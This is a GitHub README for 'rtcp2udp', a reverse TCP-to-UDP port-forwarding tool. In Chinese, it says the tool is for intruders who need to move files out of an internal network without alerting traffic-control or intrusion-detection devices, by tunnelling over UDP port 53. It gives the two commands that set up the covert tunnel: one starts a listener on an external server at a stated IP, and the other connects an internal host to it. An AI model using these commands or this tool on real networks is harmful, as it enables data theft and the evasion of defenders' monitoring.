# rtcp2udp
反向端口转发工具  
Reverse TCP Port to UDP Forwarding Tools  

## 描述
在Hack场景中，Hack人员需要从内网获取指定文件，并向外网传输时，不被流控设备，入侵检测设备所警觉；  
于是有了本工具，本工具的原理为，向外网服务器建立一个反向的UDP端口(53)隧道，用于文件传输；  

## 实例图
![](https://github.com/ring04h/rtcp2udp/blob/master/portmap.png?20160429)

## 使用说明
Http Server  <- 内网机器 -> Internet Server  
client request -> tcp:119.29.29.29:80 -> udp:119.29.29.29:53 -> tcp:172.168.1.10:80

1. 在你的外网服务器监听用于服务的 UDP&TCP 端口
```bash
# 这里假设场景,你的外网服务器 IP 为 119.29.29.29
python tcp2udp.py -t 0.0.0.0:80 -u 0.0.0.0:53
```
2. 在内网机器打通与外网服务器之间的 UDP 隧道
```bash
python rtcp2udp.py -t 172.168.1.10:80 -u 119.29.29.29:53
```